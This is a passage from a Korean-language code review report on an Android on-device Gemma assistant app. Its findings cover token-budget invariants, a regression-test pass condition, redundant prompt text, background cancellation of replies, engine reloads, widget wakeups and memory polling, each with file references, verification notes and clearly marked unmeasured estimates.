- 왜: '실측 + 프로필 상한 ≤ 예약'이 이 프로젝트 예산 설계의 핵심 주장인데, 설정 화면에서 고를 수 있는 값 하나가 그 계산 밖에 있다. 프로필을 꽉 채우고 간결·자세히를 고르면 예약을 0~수 토큰 넘거나 여유가 사실상 0 이 된다. 넘는 폭이 작아 당장 눈에 띄는 고장은 없지만(대화 기록 몫이 그만큼 조용히 줄 뿐), '여유 20토큰'을 근거로 다음 줄을 넣을 때 실제 여유는 그보다 작다. 불변식 테스트가 실제 최악값과 맞지 않는다는 점은 면접에서 방어하기 어려운 종류의 빈틈이다.
- 제안: 실험 없이 할 수 있는 것부터: PromptFixtureExportTest 가 간결·자세히 변형 시스템 지시도 내보내고, 다음에 실험실을 돌릴 때 `engine.tokenize` 로 두 줄의 비용을 재서 TokenBudgetInvariantTest 에 `MEASURED_STYLE_LINE_MAX` 상수로 더한다(불변식: 예약 ≥ 실측 + 프로필 상한 + 스타일 줄). 재 보고 여유가 음수면 그때 예약을 올릴지(대화 기록 몫 감소) 사용자 결정을 받는다. 문구 자체는 바꾸지 않는다.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/context/PromptAssembler.kt:174-181 — 간결이면 'Answer in one or two short sentences. Do not restate the question or add a preamble.', 자세히면 'Answer thoroughly: …' 한 줄이 시스템 지시에 더 붙는다(각각 대략 15~20토큰으로 추정 — 재지 않았다)
  - app/src/test/java/com/kosmos/app/assistant/context/PromptFixtureExportTest.kt:55, 92 — 실측의 근거인 픽스처는 responseStyle = "DEFAULT" 로만 내보낸다
  - app/src/test/java/com/kosmos/app/core/TokenBudgetInvariantTest.kt:74-81, 245 — 불변식은 예약 1,400 ≥ 실측 1,280 + 프로필 상한 100 만 본다. 여유는 20
  - app/src/main/java/com/kosmos/app/feature/settings/SettingsScreen.kt:194-196 — 간결·기본·자세히 세 값을 설정 화면에서 고를 수 있다
- 검증: 직접 확인. PromptAssembler.kt:147~148 은 말투 줄 뒤에 styleInstruction 을 한 줄 더 붙이고, 174~181줄에서 간결 'Answer in one or two short sentences. Do not restate the question or add a preamble.', 자세히 'Answer thoroughly: give the reasoning and the relevant context, not just the conclusion.', 그 밖의 값은 `[Style: …]` 로 그대로 들어간다. PromptFixtureExportTest.kt:55·92·126·147 은 전부 DEFAULT 라 실측(MEASURED_OVERHEAD 1280, TokenBudgetInvariantTest.kt:245)에 이 줄이 없다. 불변식(74~81줄)은 예약 1400 ≥ 1280 + 프로필 100 만 보므로 여유 20 과 스타일 줄(대략 15~20토큰 추정, 미측정)이 같은 크기다. SettingsScreen.kt:193~196 에서 세 값을 고를 수 있음 확인. 자세히는 말투 줄에서 'briefly' 한 낱말이 빠져 1토큰쯤 상쇄된다. 넘치더라도 결과는 대화 기록 몫이 수 토큰 줄 뿐이고 엔진 용량과는 큰 여유가 있어 실해는 작다 — 불변식 정확성(포트폴리오 방어) 문제로 낮게. 제안은 문구 불변, 측정만 추가.
- 앞선 기록: CHANGELOG 0.38.5 M4(701줄, 말투 줄 실측 — '자세히는 briefly 를 뺀 판') · CHANGELOG 1338줄(응답 스타일 라벨을 지시문으로 품) · CHANGELOG 0.42.1(예약 1,450 → 1,400) — 스타일 지시 줄의 토큰 실측은 찾지 못함

### prompt-9 · 기억→알림 묶음(remind_mem)은 기준값에 없어 비교되지 않고, 통과 조건이 설명과 다르게 짜여 있다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 접은 기능의 '다음에 잴 때의 기준'으로 남긴 묶음인데, 지금 모양으로는 매번 0/4 로만 나오고 가장 중요한 구분(지어낸 시각으로 알림을 넣었는가 vs 되물었는가)을 못 한다. 0.42.9 실험에서 실제로 문제였던 것이 '지어낸 시각 2건'이었으므로, 다음에 시스템 지시를 손볼 때 이 묶음이 위험 신호를 주지 못한다. 전체 실행 시간만 늘린다.
- 제안: 통과 조건을 둘로 나눠 적는다 — (가) 지어낸 시각 알림이 없다(되묻기 포함, 지금 앱이 지켜야 할 것) (나) 메모 시각으로 정확히 맞췄다(접은 기능, 정보용). 결과 메모에 어느 쪽인지 찍고, (가) 기준으로 지금 값을 한 번 확인한 뒤 사용자 확인을 받아 baseline.json 에 저장한다. 기준값 저장 전까지는 기본 실행 목록에서 빼고 `--sets=remind_mem` 로만 돌게 해도 된다.
- 근거:
  - scratch/lab/regression/baseline.json — 묶음 16개만 있고 remind_mem 이 없다. last_run.json 에는 remind_mem 0/4 로 남아 있다
  - scratch/lab/regression/run.py:877 — '기준에서 새로 깨진 것'은 기준값에 있는 묶음만 비교한다(`if n in baseline`) — remind_mem 은 좋아지든 나빠지든 표시되지 않는다
  - scratch/lab/regression/run.py:803-815 — 설명은 '시각을 맞추거나, 못 하면 묻는다(지어낸 시각 알림 0건이어야 통과)'인데 814줄에서 '묻는 경우'를 통과로 계산해 놓고 815줄 `bool(ok) and bool(rem)` 로 다시 실패 처리한다. 지어낸 시각을 넣은 경우와 얌전히 되물은 경우가 똑같이 실패로 찍힌다
- 검증: 사실 관계는 모두 맞다: baseline.json 은 16묶음뿐이고 remind_mem 없음, last_run.json:88~90 에 0/4, run.py:877 은 `if n in baseline` 인 묶음만 '새로 깨진 것'을 비교. run.py:814 는 '되묻기(알림 없음 + search_memory 실행)'를 ok 로 계산한 뒤 815줄 `bool(ok) and bool(rem)` 로 다시 실패 처리해, 803줄 설명('못 하면 묻는다 … 지어낸 시각 알림 0건이어야 통과')과 판정이 어긋난다 — 지어낸 시각 알림과 얌전한 되묻기가 구분되지 않는 것은 실제 결함. 다만 '기준값에 없어 비교되지 않는다'는 부분은 빈틈이 아니라 기록된 결정이다(기준 저장은 사용자 확인 뒤, 지금은 실패가 정상). 따라서 고칠 가치가 있는 것은 통과 조건을 '지어낸 시각 없음'과 '정확히 맞춤'으로 나누는 것뿐이고, 기준값 저장·기본 목록 제외는 사용자 결정 사항으로 남긴다.
- 앞선 기록: CHANGELOG 0.42.9(31줄 '지금 앱은 실패가 정상 — 다음에 잴 때의 기준') · docs/plans/0.42.10-real-use-start-check.md:36('기준값(지금 0/4)은 아직 저장 안 함 — 저장은 사용자 확인 뒤')

### prompt-10 · 토큰 여유를 되찾을 후보 — 선언과 시스템 지시에 같은 내용이 두세 번 적힌 자리 세 곳
- 판정 일부만 맞음 · 중요도 낮음 · 크기 M · 모델 입력
- 왜: 다음 후보로 적어 둔 '할 일 툴'을 넣으려면 여유 20토큰으로는 모자라고, 0.42.9 처럼 18토큰 한 줄도 다른 묶음을 흔든다. 새 문장을 넣기 전에 겹친 문장을 빼서 자리를 만드는 편이 안전하다. AGENTS §2-⑤ 도 '선언과 트리거 규칙에 같은 정보를 두 번 쓰지 않는다'고 정해 두었다. 특히 메모 저장 선언의 '사실·선호·비밀번호 등을'은 기록에 끌린 사실 저장(가드로 막고 있는 문제)을 부추길 수 있는 문구다. 다만 이 모델은 문구 하나에 민감해서 실제 효과는 재 봐야 안다 — 추정이다.
- 제안: 한 회차로 묶어 실험실에서 잰다(실측 선행, §2-⑤). 후보: (가) 기억 검색 트리거에서 'with a short noun keyword' 빼기(약 6토큰) (나) 끝의 '선택 인자…' 두 문장 빼거나 한 문장으로(약 20토큰 — 일정 줄의 'never ask for end_time or memo' 가 exp87 로 검증된 쪽이라 그것을 남김) (다) 메모 저장 선언을 '메모를 저장한다.'로(약 10토큰, fact 묶음이 좋아지는지도 함께). 판정은 회귀 세트 전체 + optional·fact·clock 묶음에서 새로 깨진 것 0, 그리고 `engine.tokenize` 차이로 MEASURED_OVERHEAD(한/영) 갱신. kosmos_lab.py 의 선언 미러도 같이 고친다. 하나라도 흔들리면 그 후보만 버린다.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/context/PromptAssembler.kt:262, 264 — 기억 검색 트리거 줄의 'with a short noun keyword' 와 app/src/main/java/com/kosmos/app/runtime/gemma/KosmosToolDeclarations.kt:147-148 의 인자 설명 '문장이 아니라 명사 위주의 짧은 단어로 쓴다. 예: …' 가 같은 내용
  - app/src/main/java/com/kosmos/app/assistant/context/PromptAssembler.kt:270, 272 — 일정 추가 줄 끝 'never ask for end_time or memo', 같은 파일 326-329 '선택 인자는 물을 이유가 아니다. 필수 인자가 없을 때만 물어라'(두 문장), KosmosToolDeclarations.kt:108-109 '모르면 시작 1시간 뒤'·'없으면 빈 문자열' — 선택 인자를 묻지 말라는 말이 세 곳
  - app/src/main/java/com/kosmos/app/runtime/gemma/KosmosToolDeclarations.kt:128 — 메모 저장 선언이 '사용자에 관한 사실·선호·비밀번호 등을 영구 기억으로 저장한다'인데, PromptAssembler.kt:254-256 은 '사실만 말하면 저장하지 말고 물어라'이고 그 호출을 막는 가드까지 있다(ToolCallGuards.kt:60-63). 선언이 가드가 막는 행동을 권하는 문장을 그대로 갖고 있다
  - app/src/test/java/com/kosmos/app/core/TokenBudgetInvariantTest.kt:245 — 지금 여유는 1,400 − 1,280 − 100 = 20토큰
- 검증: 겹친 문구가 있다는 사실은 확인: PromptAssembler.kt:262·264 'with a short noun keyword' 와 KosmosToolDeclarations.kt:147~148 '문장이 아니라 명사 위주의 짧은 단어로'; PromptAssembler.kt:270·272 'never ask for end_time or memo' 와 327~328 'Optional parameters are never a reason to ask…' 및 선언 108~109줄('모르면 시작 1시간 뒤', '없으면 빈 문자열'); 선언 128줄 '사용자에 관한 사실·선호·비밀번호 등을 영구 기억으로 저장한다' 와 PromptAssembler.kt:254~256 '사실만 말하면 묻는다' + 가드(ToolCallGuards.kt:60~63). 여유 20토큰도 맞다. 그러나 '고칠 가치'는 미확정이다: 세 자리 모두 여러 번의 실측 다이어트(exp41·68·95)를 거치며 남은 문구이고, 특히 일정 줄 끝 문장은 겹침을 알고도 넣은 판이 이겼으며(exp87, 선언만 고친 판은 4/8), 'Optional parameters…' 문장은 상대 날짜를 '없는 정보'로 보던 결함을 고친 줄(323~325줄 주석)이라 빼면 회귀 위험이 있다. 절감 토큰 수(6·20·10)와 '선언 문구가 사실 저장을 부추긴다'는 주장은 측정 근거가 없다. 결함이 아니라 실측이 선행돼야 하는 실험 후보로만 유효(모델 입력 변경 — kosmos_lab.py 선언 미러·MEASURED_OVERHEAD 동시 갱신 필요).
- 앞선 기록: CHANGELOG 0.21.0·0.39.3 M1(exp41·exp68 선언 다이어트) · 0.42.1(exp95 트리거 압축 −54, PromptAssembler.kt:248~249 주석) · 0.41.11 M2(exp87 — 일정 줄 끝 문장 추가, '선언 설명을 고친 판은 4/8') · AGENTS §2-⑤(같은 정보를 두 번 쓰지 않는다)

<details><summary>읽은 범위</summary>

직접 끝까지 읽은 파일: PromptAssembler.kt(332줄), KosmosToolDeclarations.kt, ToolResultJson.kt, ToolCallGuards.kt, BaseAgent.kt(588줄 전부), KosmosAgent.kt, ReplyFinisher.kt, DataMarker.kt, ContextBuilder.kt(60줄 이후), :domain 의 RepeatRequest·MemoSaveIntent·RefusalTurns·RepeatedQuestions·RejectionReplies·IdleGapHistory·SchedulePastIntent·ScheduleTimeIntent·ScheduleWeekdayIntent·ToolKvBudget, TokenBudgetInvariantTest.kt, PromptFixtureExportTest.kt, DocumentTurnReminderTest.kt, scratch/lab/regression/run.py(884줄 전부)·baseline.json·last_run.json, scratch/lab/kosmos_lab.py(190줄 전부), .agents/04_MODEL_EVIDENCE.md, Constants.kt 의 토큰 상수, CHANGELOG 0.42.7~0.42.10 절. 일부만 본 것: SearchMemoryToolExecutor(결과 문구 부분), AddReminderToolExecutor(결과 문구), architecture.md·plans 는 grep 으로 관련 줄만, 가드 단위 테스트는 grep 으로 문항 유무만 확인. 읽지 못한 것: GemmaModelRunner(대화 재설정·currentKvTokens 구현 본문), SearchDocuments/GetSchedule/ListReminders 실행기의 결과 문구 전체, ToolParser, ProfileBlock 의 상한 처리 세부, AttachedDocumentBlock. 규칙대로 gradle·파이썬·adb 는 실행하지 않았으므로 토큰 수(스타일 줄 15~20, 다이어트 후보별 절감량)는 모두 추정이고, 모델이 실제로 그렇게 행동하는 빈도(prompt-3·4)는 재지 않았다 — 가드 판정 경로만 코드로 확인했다.

확인했지만 문제없던 것: kosmos_lab.py 의 툴 선언 미러 8종은 앱 선언과 글자까지 같다. run.py 의 가드 정규식 대부분(REPEAT·SAVE_WORD·SAVE_ASK·YES·일정 시각/몇 시·요일·지난 시각 날짜 낱말·반복 질문)은 앱과 같다. 예산 불변식의 상수 관계(천장·예약·문서 검색 예약)는 현재 값으로 성립한다.

10건에 넣지 않고 버린 것(5건): ① 영어 모드에서도 툴 선언이 한국어인 점 — ADR(architecture.md 2168줄, exp72 12/12)로 알고 정한 결정이라 제외. ② 한국어 '기억나?' 같은 조회 질문이 사실 저장 가드를 통과하는 점 — overlap 묶음 RECALL_WORD 로 이미 추적 중이고 통과 상태. ③ 거절 판정('드릴 수 없')이 '…해 드릴 수 없어요. 내일로 잡을까요?'처럼 되묻는 답까지 모델 기록에서 빼 다음 턴 '응'의 맥락이 사라질 수 있는 점 — 코드상 가능하지만 실제 그런 답이 나온 증거가 없어 추정 수준이라 제외. ④ 반복 질문 판정의 질문 낱말('몇'·'어떤')이 진술문에도 걸리는 점 — 영향이 작고 재현 문장을 특정하지 못함. ⑤ JVM(테스트)과 안드로이드의 정규식 낱말 경계(\b) 처리 차이로 한글 바로 옆 영어 낱말 판정이 갈릴 수 있는 점 — 해당하는 실제 문장이 드물고 확인하지 못해 제외.

</details>

## 성능·배터리 (perf)

### perf-1 · 답을 기다리는 중에 다른 앱으로 가거나 화면을 끄면 답이 끊기고 엔진까지 내려간다
- 판정 확인됨 · 중요도 높음 · 크기 M
- 왜: 휴대폰에서 답 하나가 10~30초 걸린다. 매일 쓰면 질문을 보내고 다른 앱을 보거나 화면을 끄는 일이 가장 흔한 동작인데, 그때마다 답이 잘리거나 오류 말풍선이 남고 돌아오면 엔진을 9~12초 다시 올린다. 승인 시트에서 '정확한 알람 설정'으로 나갔다 오는 경로(ChatScreen.kt:551-556)도 같은 길을 탄다. 실사용에서 바로 걸릴 빈틈이고, 문서·확인 목록 어디에도 이 동작이 적혀 있지 않다.
- 제안: 백그라운드로 갈 때 '요청이 진행 중인가'를 먼저 본다. 진행 중이면 cancelProcess 를 걸지 않고, 그 요청(툴 회신 턴까지)이 끝난 뒤에 엔진을 내린다 — 이미 있는 lifecycleMutex 가 순서를 지켜 주므로 close() 에서 취소 한 줄을 조건부로 바꾸고, 오케스트레이터가 요청 시작·끝에 '진행 중' 표시를 올리고 내리면 된다. 상한(예: 90초)을 두어 넘으면 지금처럼 끊는다. 새로 모델을 올리는 것이 아니라 하던 일을 마치는 것이라 '백그라운드에서 모델을 로드하지 않는다' 규칙과 부딪히지 않는다. 승인 대기 중이면 기다리지 않고 지금처럼 내리되, 승인 뒤 회신 실패 문구를 '저장은 됐어요'로 구분한다. 백그라운드에서 GPU 추론이 끝까지 도는지는 휴대폰에서 짧게 확인이 필요하다(화면 끔·홈 두 경우). 최소한으로는 끊긴 답을 사용자 중지와 같은 '받은 만큼 보존'으로 처리하고 확인 목록에 동작을 적는다.
- 근거:
  - app/src/main/java/com/kosmos/app/KosmosApp.kt:102-106 — 앱이 백그라운드로 가면 조건 없이 modelRunner.close() 를 부른다(답을 쓰는 중인지 보지 않는다)
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:539-557 — close() 가 지금 돌고 있는 대화에 cancelProcess 를 직접 건다(543행). 사용자 중지(requestCancel)가 아니라서 '사용자가 멈춘 턴'으로 표시되지 않는다
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:330-365 — 네이티브가 예외로 끝내면 error 로 잡혀 ModelInferenceError 실패(355-356행), 조용히 끝내면 잘린 글이 정상 답처럼 성공 처리(357-364행)
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:151-159 — 실패면 오류 말풍선만 저장하고 그때까지 흘러나온 글은 버린다
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:257-268 — 툴 실행 뒤 회신 턴은 엔진이 내려가 있으면 ModelNotReady 로 실패한다(일정은 이미 저장됐는데 오류 말풍선이 뜰 수 있다)
- 검증: 직접 읽은 근거 — KosmosApp.kt:102-115 는 onStop 에서 조건 없이 modelRunner.close() 를 부른다(119-124 onTrimMemory 도 같음). GemmaModelRunner.kt:543 은 cancellation.activeConversation()?.cancelProcess() 를 직접 부르고, TurnCancellation.kt:34-41 의 requestCancel 만 cancelled 표시를 남기므로 runTurn 의 userCancelled(339행)는 false 다. 따라서 네이티브가 예외로 끝내면 355-356행 ModelInferenceError, 조용히 끝내면 357-364행에서 잘린 글이 정상 성공으로 저장된다. BaseAgent.kt:151-159 는 실패 시 saveError 만 하고(AssistantMessageWriter.kt:69-79 — 오류 문구 말풍선 저장) 흘러나온 글은 버린다. 툴 회신 턴은 GemmaModelRunner.kt:257-258·266-267 에서 ModelNotReady 로 실패한다. MainActivity.onStop(86-89행)·ChatScreen 에는 진행 중 요청을 지키는 처리가 없다. 주장은 모두 맞다. 다만 제안의 주 경로(백그라운드에서 최대 90초 마저 끝내기)는 약하다 — 화면이 없는 프로세스는 포그라운드 서비스 없이는 시스템이 수 초~십여 초 뒤 얼리거나(캐시된 프로세스 동결) 약 7GB 라 먼저 죽일 수 있어 '끝까지 돈다'를 보장하지 못하고, onTrimMemory 도 close 를 부른다. 현실적인 1차 수정은 제안의 '최소한' 쪽이다: close() 가 끊은 턴을 사용자 중지와 같은 '받은 만큼 보존'으로 처리(close 에서 requestCancel 과 같은 표시를 남기면 350-354행 경로를 탄다), 툴 실행 뒤 회신 실패 문구를 '저장은 됐어요'로 구분, 확인 목록·사용 안내에 동작 명시. 끝까지 돌리는 안은 포그라운드 서비스 여부까지 포함해 사용자 결정과 휴대폰 확인이 필요하다.
- 앞선 기록: CHANGELOG 0.16.1·0.16.2(백그라운드 즉시 해제와 재진입 수정), 0.38.x M1(뮤텍스 안 재확인 — CHANGELOG:963), AGENTS §2-⑥. 답을 만드는 도중 백그라운드로 가는 경우를 다룬 기록은 CHANGELOG·architecture·plans·checklists·guide 어디에서도 찾지 못함

### perf-2 · 잠깐 다른 앱을 봤다 와도 매번 엔진을 처음부터 다시 올린다(유예 시간 없음)
- 판정 이미 결정·기록됨 · 중요도 중간 · 크기 M
- 왜: 매일 쓰면 '복사하러 다른 앱에 5초 다녀오기', '알림 한 번 확인' 같은 짧은 이탈이 많다. 지금은 이탈 길이와 상관없이 돌아올 때마다 약 10초(엔진) + 대화 미리 준비 몇 초를 기다린다. 메모리 반환이라는 목적은 수십 초 늦어져도 달라지지 않는다. 포트폴리오에서도 '왜 유예가 없나'는 쉽게 나올 질문이다.
- 제안: onStop 에서 바로 내리지 않고 짧은 유예(예: 30~60초, 상수로) 뒤에 내린다. 그 안에 돌아오면(onStart) 예약을 취소한다. 시스템이 메모리를 달라고 하면(onTrimMemory, KosmosApp.kt:119-125)은 지금처럼 즉시 내린다. 유예 중에는 새 추론을 시작하지 않도록 요약·벡터 만들기 멈춤은 지금처럼 onStop 에서 바로 한다(엔진만 늦게 닫는다). 이것은 '즉시 해제'로 적힌 기존 정책(AGENTS §2-⑥ 문구)을 바꾸는 일이라 사용자 결정이 먼저이고, 유예 동안 약 6.5~7GB 를 든 앱을 시스템이 죽이는 빈도는 휴대폰에서 봐야 한다. perf-1 과 같은 자리(close 호출부)를 고치므로 한 회차로 묶을 수 있다.
- 근거:
  - app/src/main/java/com/kosmos/app/KosmosApp.kt:102-116 — onStop 즉시 채팅 엔진·임베딩 엔진·낭독 엔진을 모두 내린다
  - app/src/main/java/com/kosmos/app/platform/launch/ModelWarmUpObserver.kt — 돌아오면 warmUp 으로 다시 올린다
  - app/src/main/java/com/kosmos/app/assistant/startup/StartupCoordinator.kt:95-106, 125-152 — 엔진이 준비될 때마다 지난 대화 정리·브리핑·대화 미리 준비를 다시 돌리고 그동안 입력바가 잠긴다
  - docs/CHANGELOG.md:1160 — 엔진 재초기화 9~12초 실측, docs/CHANGELOG.md:839 — 약 8.4초
- 검증: 후보의 '유예 시간을 검토한 기록은 찾지 못함'은 틀렸다 — docs/plans/0.39.x-roadmap.md:31 에 같은 안(60~90초 유예 언로드)이 외부 기획서 항목으로 올라와 일부러 버린 것으로 적혀 있다. 코드 사실 자체는 맞다: KosmosApp.kt:102-115 즉시 해제, ModelWarmUpObserver.kt:33-36 재진입마다 warmUp, StartupCoordinator.kt:92-100 Ready 마다 runStages 재실행(요약·브리핑·미리 준비, 125-152행). 기록은 문을 완전히 닫지 않았다('규칙 변경 결정 + 실기기 실측'이 조건). 다시 올리려면 새 발견이 아니라 '예전에 버린 안을 실사용 단계에서 다시 묻는다'로 사용자에게 제시해야 하고, 유예 동안 약 7GB 프로세스가 죽는 빈도 실측이 선행 조건이다.
- 앞선 기록: docs/plans/0.39.x-roadmap.md:31 '버린 것' 표 — '백그라운드 60~90초 유예 언로드: AGENTS §2-⑥ 과 충돌. 바꾸려면 규칙 변경 결정 + 실기기 실측'. CHANGELOG 0.16.2(:1160 재초기화 9~12초를 재진입 직후로 옮김), AGENTS §2-⑥, ADR-027

### perf-3 · 30분 넘게 쉰 뒤 첫 답은 시스템 지시 읽기(약 4.6초)를 그 턴이 그대로 치른다
- 판정 이미 결정·기록됨 · 중요도 낮음 · 크기 M · 모델 입력
- 왜: 실사용에서 가장 흔한 첫 질문이 바로 '한참 뒤에 앱을 열고 묻는 첫 마디'다. 시작 단계가 채팅을 열기 전에 미리 준비까지 끝냈다고 화면에 보여 주는데도, 이 경우에는 첫 글자까지 4~5초가 더 붙는다. 이미 알려진 항목이지만 실사용 단계에서 체감이 가장 큰 지연이라 우선순위를 올릴 만하다.
- 제안: 기록이 비었을 때도 시스템 지시·툴 선언을 미리 읽히는 방법을 실험실에서 먼저 잰다. 후보: (가) 빈 모델 메시지 또는 한 글자짜리 모델 메시지를 출력 상한 1로 보내기, (나) 대화 생성 뒤 토큰 수 조회 같은 읽기 전용 호출이 읽기를 일으키는지 확인, (다) 요약 줄로 바뀐 지난 대화의 마지막 답만 남겨 보내기(이건 '지난 물음을 이어받는' 문제를 되살릴 수 있어 마지막 순위). 어느 쪽이든 대화에 한 토큰이 남으므로 회귀 세트로 답이 흔들리지 않는지 확인한 뒤 넣는다.
- 근거:
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:444-460 — 미리 준비는 '마지막 비서 답'을 모델 메시지로 보내 읽기를 미리 치르는데, 기록이 비면(last == null) 대화만 만들고 돌아온다(460행)
  - app/src/main/java/com/kosmos/app/assistant/context/ContextBuilder.kt:175-182 — 오래 쉰 뒤에는 지난 대화를 요약 한 줄로 바꾸고 원문을 기록에서 빼므로 기록이 비게 된다
  - docs/CHANGELOG.md:385 — 휴대폰 실측: 프리필 1,294토큰 약 4.6초, '다음 후보(빈 기록일 때 시스템 지시만 미리 읽히는 방법 — 실측 선행)'
- 검증: 현상은 맞다 — GemmaModelRunner.kt:444-460(460행 last == null 이면 돌아옴), ContextBuilder.kt:175-183(쉰 뒤 원문을 빼고 요약 줄로), CHANGELOG:385. 그러나 후보가 '미착수'라고 한 것은 틀렸다. 바로 다음 회차 0.41.9 가 이 문제를 출발점으로 삼아 실측까지 하고 닫았다. 제안의 (가) 빈·한 글자 model 메시지는 exp84b 에서 기각, (다) 요약 쪽 메시지를 보내는 안은 exp84 에서 기각, 라이브러리 옵션(prefillPrefaceOnInit)은 휴대폰에서 원인 모를 깨진 답 1/5 로 사용자 결정으로 쓰지 않기로 했고 '다음 라이브러리 때 다시 잰다'로 남겼다(옵션은 chatConversationConfig 에 기본 꺼짐으로 남아 있음). 남는 것은 (나) 토큰 수 조회가 읽기를 일으키는지뿐인데, 기록(exp66b — 대화 생성은 문법 준비뿐, 읽기는 첫 send)상 가능성이 낮다. 지금 다시 올릴 근거가 없다 — 라이브러리 판이 바뀔 때 재측정 후보로만 유지.
- 앞선 기록: CHANGELOG 0.41.9 — :354 M0 실험실(exp84 요약을 기록 메시지로 옮기는 안 기각, exp84b 빈 model 메시지 미리 읽기 기각: 지금과 일치 1/24·자기 이름을 Kosmos 로 15/24), :359 [Decision] '앞부분 미리 읽기는 쓰지 않는다'(휴대폰 실측, 켬 5번 중 1번 답 깨짐, 사용자 결정 2026-11-10, ADR-030 보충), :362 '켜도 GPU 일은 시점만 옮긴다'. 계획서 docs/plans/0.41.9-library-followups.md(완료)

### perf-4 · 홈 위젯이 30분마다 기기를 깨워 앱 전체를 띄운다(하루 48번)
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 이 주기 갱신은 기기가 잠들어 있어도 깨운다. 내용이 바뀌는 순간은 쓰기 경로가 이미 갱신하므로, 주기 갱신이 실제로 하는 일은 하루 한 번 날짜가 넘어갈 때뿐이다. 한 번의 비용은 작지만 매일 쓰는 휴대폰에서 밤새 30분마다 프로세스를 띄우는 것은 설명하기 어려운 배터리 사용이다.
- 제안: 주기를 0 으로 끄고, 자정 직후 한 번만 다시 그리게 한다 — 이미 쓰는 WorkManager 의 '다음 시각까지 지연 후 자기 재예약' 방식(BriefingNotificationScheduler 와 같은 모양)으로 자정 1~2분 뒤 작업 하나를 건다. 날짜·시간대 변경 방송을 받는 수신기를 더하면 수동 시각 변경도 덮는다. 기기 캘린더에서 직접 고친 일정은 지금도 30분 늦게 보이므로, 그 반영이 필요하면 주기를 몇 시간으로 늘리는 절충도 있다.
- 근거:
  - app/src/main/res/xml/widget_kosmos_info.xml:3,13 — updatePeriodMillis 1800000, 이유는 '자정 넘김 반영' 하나
  - app/src/main/java/com/kosmos/app/widget/KosmosWidget.kt (provideGlance) — 갱신마다 오늘 일정(기기 캘린더 포함)과 할 일 100건을 읽는다
  - app/src/main/java/com/kosmos/app/KosmosApp.kt:29-70, 87-96 — 프로세스가 죽어 있으면 갱신 때마다 앱이 새로 뜨며 상주 컴포넌트 11개와 DB 를 만든다
  - app/src/main/java/com/kosmos/app/widget/WidgetRefresher.kt — 일정·할 일이 바뀌면 이미 쓰기 경로에서 바로 다시 그린다
- 검증: widget_kosmos_info.xml:13 updatePeriodMillis=1800000, 3-5행 주석은 '이 갱신은 기기를 깨우지 않는다'고 적는데 이는 플랫폼 동작과 반대다 — updatePeriodMillis 갱신은 잠든 기기를 깨워 실행된다(안드로이드 위젯 문서의 알려진 동작, 30분이 최소값). 즉 30분 주기는 틀린 전제 위의 결정이다. KosmosWidget.kt:72-85 는 갱신마다 오늘 일정 + 할 일 100건을 읽고, WidgetSnapshot.kt:52-75 에서 시각에 따라 바뀌는 것은 날짜 표시(68행)뿐이라(지난 일정을 걸러 내거나 '다음 일정'을 고르지 않음) 주기 갱신이 실제로 하는 일은 날짜 넘김과 기기 캘린더에서 직접 고친 일정 반영 둘이다. 프로세스가 죽어 있으면 KosmosApp.onCreate(86-96행)가 통째로 돈다(모델은 올리지 않음 — warmUp 은 MainActivity 단위). 한 번의 비용은 작아 심각도는 낮음. 고칠 세부: 주석의 '깨우지 않는다' 문장은 어느 쪽으로 결정하든 정정해야 하고, 주기를 0 으로 하면 기기 캘린더 변경 반영이 사라지는 점(후보도 언급)과 실기기 게이트 ③ 문구를 함께 고쳐야 한다.
- 앞선 기록: CHANGELOG 0.22.0(:1031 '30분 주기는 자정 넘김 보정 전용', :1032 실기기 게이트 ③ 자정 넘김 30분 내 반영), widget_kosmos_info.xml 의 [WHY] 주석. 주기의 배터리 비용이나 기기 깨움을 따진 기록은 없음

### perf-5 · 상단 상태 캡슐을 위해 약 7GB 짜리 프로세스의 메모리를 2~5초마다 전부 훑는다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 이 호출은 프로세스가 잡은 메모리 지도를 전부 읽어 합산하므로 프로세스가 클수록 느리다. '수십 ms'는 메모리가 더 작던 때의 어림이고, 지금 크기에서 실제로 얼마인지 잰 기록이 없다. 답을 만드는 동안 2초마다 CPU 코어 하나를 그만큼 쓰고, 화면을 켜 둔 채 쉬는 동안에도 5초마다 계속 돈다. 값 자체(앱 메모리)는 엔진을 올린 뒤 거의 변하지 않는다(같은 기록: KV 는 올릴 때 한꺼번에 잡힌다).
- 제안: 먼저 한 번 걸리는 시간을 로그로 잰다(디버그 한 줄). 수십 ms 를 크게 넘으면 온도(싼 값)와 메모리(비싼 값)의 주기를 가른다 — 온도는 지금처럼, 앱 메모리는 엔진이 준비된 직후 한 번 + 상태 시트를 열었을 때 + 길게(예: 30~60초)만. 변하지 않는 값을 자주 재지 않는 쪽으로 정리하면 주석의 숫자도 실제와 맞출 수 있다.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:305-321, 733-734 — 채팅 화면이 보이는 동안 답 생성 중 2초, 쉴 때 5초마다 갱신
  - app/src/main/java/com/kosmos/app/platform/device/DeviceResourceProvider.kt:37, 55 — Debug.getMemoryInfo 를 매번 부른다. 주석은 '수십 ms'라고 적혀 있다
  - docs/CHANGELOG.md:393 — 지금 앱 PSS 는 6.46~6.97GB(주석을 쓸 때의 4GB 대보다 크다)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatHeader.kt:323-325 — 캡슐에 온도와 앱 메모리(GB)를 함께 보인다
